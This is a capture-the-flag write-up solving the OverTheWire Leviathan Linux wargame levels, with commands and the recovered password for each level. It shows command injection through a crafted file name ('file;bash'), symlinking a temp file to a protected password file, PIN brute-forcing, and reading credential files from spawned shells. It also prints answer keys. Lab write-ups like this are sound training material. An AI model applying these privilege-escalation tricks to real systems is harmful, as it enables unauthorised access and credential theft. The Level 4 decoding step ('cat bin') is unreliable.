# OverTheWire Leviathan Wargame Writeup

## Introduction
Leviathan is a wargame provided by OverTheWire (OTW), designed to teach Linux command-line skills, file system navigation, and basic security concepts. The objective is to progress through a series of levels (0 to 6) by finding the password (key) for each level to access the next. Each level runs on a remote Linux server, and players connect via SSH to solve challenges. The passwords are stored in the `/etc/leviathan_pass/` directory, accessible only by the user of the next level.

This repository contains a detailed writeup of the solutions for all Leviathan levels, based on my progression through the challenges. Each level's solution is documented with commands, explanations, and the resulting key.

## Prerequisites
To play Leviathan, you need:
- A Linux environment (or a terminal emulator like PuTTY for Windows).
- Basic knowledge of Linux commands (`ls`, `cat`, `find`, `ltrace`, etc.).
- An SSH client to connect to the Leviathan server.
- Access to the OverTheWire Leviathan server (`leviathan.labs.overthewire.org`).

### Getting Started
1. Connect to the Leviathan server using SSH:
   ```bash
   ssh leviathan0@leviathan.labs.overthewire.org -p 2223
   ```
   The initial password for `leviathan0` is provided on the [OverTheWire Leviathan page](https://overthewire.org/wargames/leviathan/).
2. Each level requires finding the password for the next level, typically stored in `/etc/leviathan_pass/leviathanX`.
3. Use Linux commands and tools to explore the environment, analyze files, and exploit vulnerabilities.

## Level Writeups

### Level 0 → Level 1
**Objective**: Find the password for `leviathan1`.

**Solution**:
- Start by listing the directory contents:
  ```bash
  ls -la
  ```
  This reveals a hidden directory named `.backup`.
- Navigate to the `.backup` directory and inspect its contents:
  ```bash
  cd .backup
  ls
  ```
  A file named `bookmarks.html` is found.
- Search for the password within `bookmarks.html`:
  ```bash
  cat bookmarks.html | grep password
  ```
  This reveals the password for `leviathan1`.

**Key**: `3QJ3TgzHDq`

### Level 1 → Level 2
**Objective**: Gain access to `leviathan2` by exploiting the `check` binary.

**Solution**:
- List the directory contents:
  ```bash
  ls
  ```
  A binary named `check` is present.
- Use `ltrace` to debug the binary and observe its behavior:
  ```bash
  ltrace ./check
  ```
  `ltrace` shows that the binary compares the input to a hardcoded password (`sex`).
- Run the binary with the correct password:
  ```bash
  ./check
  ```
  Input `sex` when prompted. This spawns a shell.
- In the shell, read the password for `leviathan2`:
  ```bash
  cat /etc/leviathan_pass/leviathan2
  ```

**Key**: `NsN1HwFoyN`

### Level 2 → Level 3
**Objective**: Exploit the `printfile` binary to gain access to `leviathan3`.

**Solution**:
- List the directory contents:
  ```bash
  ls -la
  ```
  A setuid binary named `printfile` is found, owned by `leviathan3` with permissions `-r-sr-x---`.
- Test the binary's functionality:
  ```bash
  ./printfile
  ```
  The binary reads and displays the contents of a file, but it runs with `leviathan3` privileges.
- Exploit the binary using command injection:
  - Create a temporary directory:
    ```bash
    mktemp -d
    ```
    This creates a directory, e.g., `/tmp/tmp.XXXXXX`.
  - Create a file with a malicious name to inject a command:
    ```bash
    touch '/tmp/tmp.XXXXXX/file;bash'
    ```
  - Run `printfile` with the crafted path:
    ```bash
    ./printfile '/tmp/tmp.XXXXXX/file;bash'
    ```
    The `;bash` part spawns a shell with `leviathan3` privileges.
- In the shell, read the password:
  ```bash
  cat /etc/leviathan_pass/leviathan3
  ```

**Key**: `f0n8h2iWLP`

### Level 3 → Level 4
**Objective**: Exploit the `level3` binary to gain access to `leviathan4`.

**Solution**:
- List the directory contents:
  ```bash
  ls
  ```
  A binary named `level3` is present.
- Use `ltrace` to analyze the binary:
  ```bash
  ltrace ./level3
  ```
  `ltrace` reveals that the binary uses `snprintf` to construct a command and compares the input to a hardcoded password (`snlprintf`).
- Run the binary with the correct password:
  ```bash
  ./level3
  ```
  Input `snlprintf` to spawn a shell.
- Read the password for `leviathan4`:
  ```bash
  cat /etc/leviathan_pass/leviathan4
  ```

**Key**: `WG1egElCvO`

### Level 4 → Level 5
**Objective**: Decode the output of the `bin` binary to find the password for `leviathan5`.

**Solution**:
- List the directory contents:
  ```bash
  ls
  ```
  A binary named `bin` is present.
- Run the binary:
  ```bash
  ./bin
  ```
  The output is a binary string (e.g., `01000100 01111001 01111000 01010100 ...`).
- Convert the binary string to ASCII:
  ```bash
  cat bin
  ```
  Alternatively, manually decode the binary string (each group of 8 bits represents an ASCII character). For example:
  - `01000100` → `D`
  - `01111001` → `y`
  - Continue decoding to form the string.
- The decoded string is the password.

**Key**: `0dyxT7F4QD`

### Level 5 → Level 6
**Objective**: Use a symbolic link to trick the `leviathan5` binary into revealing the password.

**Solution**:
- List the directory contents:
  ```bash
  ls
  ```
  A binary named `leviathan5` is present, which likely reads a file named `/tmp/file.log`.
- Create a symbolic link to the password file:
  ```bash
  ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
  ```
- Run the binary:
  ```bash
  ./leviathan5
  ```
  The binary reads `/tmp/file.log`, which is linked to the password file, and outputs the password.

**Key**: `szo7HDB88w`

### Level 6 → Level 7
**Objective**: Brute-force the PIN code for the `leviathan6` binary.

**Solution**:
- List the directory contents:
  ```bash
  ls
  ```
  A binary named `leviathan6` is present, which expects a 4-digit PIN as input.
- Use a bash loop to brute-force the PIN (0000 to 9999):
  ```bash
  for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
  ```
  The correct PIN spawns a shell.
- In the shell, read the password:
  ```bash
  cat /etc/leviathan_pass/leviathan7
  ```

**Key**: `qEs5Io5yM8`

## Notes
- Always check file permissions (`ls -la`) to identify setuid binaries or hidden files.
- Tools like `ltrace` are invaluable for debugging binaries and uncovering hardcoded values.
- Be cautious with command injection and symbolic links, as they rely on understanding how binaries interact with the file system.
- The solutions assume familiarity with basic Linux commands. For more details, refer to the [OverTheWire Leviathan page](https://overthewire.org/wargames/leviathan/).

## Contributing
Feel free to fork this repository and add your own solutions or improvements. Pull requests are welcome!

## License
This writeup is provided under the MIT License. See the [LICENSE](LICENSE) file for details.